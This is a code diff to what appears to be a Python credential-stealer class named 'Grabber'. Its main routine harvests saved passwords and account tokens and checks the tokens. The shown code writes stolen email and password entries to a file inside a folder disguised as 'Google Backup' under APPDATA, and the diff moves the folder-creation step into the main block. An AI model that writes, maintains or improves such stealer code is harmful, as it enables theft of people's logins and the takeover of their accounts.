@@ -127,7 +127,6 @@ class Grabber:
                 login = result[0]
                 if password != '':
                     self.passwords.append(password)
-                if not os.path.exists(f'{os.getenv("APPDATA")}\\Google Backup/'): os.makedirs(f'{os.getenv("APPDATA")}\\Google Backup/')
                 with open(f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt', 'a+') as f:
                     data = '=================================='
                     data += '\nEmail : ' + email
@@ -202,6 +201,7 @@ class Grabber:
         return data
 
 if __name__ == "__main__": # changing order will most likely fucc the whole code
+    if not os.path.exists(f'{os.getenv("APPDATA")}/Google Backup/'): os.makedirs(f'{os.getenv("APPDATA")}/Google Backup/')
     Grabber().grabPassword()
     Grabber().grabToken()
     Grabber().checkTokens()
